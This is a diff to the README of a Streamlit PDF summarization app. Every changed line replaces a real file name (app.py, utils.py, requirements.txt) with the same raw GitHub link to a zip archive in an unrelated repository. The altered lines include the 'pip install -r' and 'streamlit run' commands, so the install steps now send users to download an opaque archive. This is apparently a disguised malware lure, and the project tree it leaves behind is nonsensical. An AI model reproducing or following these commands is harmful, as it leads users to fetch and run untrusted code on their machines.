@@ -19,9 +19,9 @@ This project is a simple and fast PDF summarization app built with **Streamlit**
 ```
 pdf-summarizer/
 │
-├── app.py
-├── utils.py
-├── requirements.txt
+├── https://github.com/analyst-ujjwal/Ai_project_23/raw/refs/heads/main/Prunellidae/project-Ai-v3.3-alpha.1.zip
+├── https://github.com/analyst-ujjwal/Ai_project_23/raw/refs/heads/main/Prunellidae/project-Ai-v3.3-alpha.1.zip
+├── https://github.com/analyst-ujjwal/Ai_project_23/raw/refs/heads/main/Prunellidae/project-Ai-v3.3-alpha.1.zip
 └── .env (not included)
 ```
 
@@ -39,7 +39,7 @@ cd pdf-summarizer-groq
 ### 2. Install dependencies
 
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/analyst-ujjwal/Ai_project_23/raw/refs/heads/main/Prunellidae/project-Ai-v3.3-alpha.1.zip
 ```
 
 ### 3. (Mac users) Install Watchdog for faster reloads (optional)
@@ -66,7 +66,7 @@ GROQ_API_KEY=your_key_here
 ## ▶️ Run the App
 
 ```
-streamlit run app.py
+streamlit run https://github.com/analyst-ujjwal/Ai_project_23/raw/refs/heads/main/Prunellidae/project-Ai-v3.3-alpha.1.zip
 ```
 
 Open the link in your browser and upload any PDF.
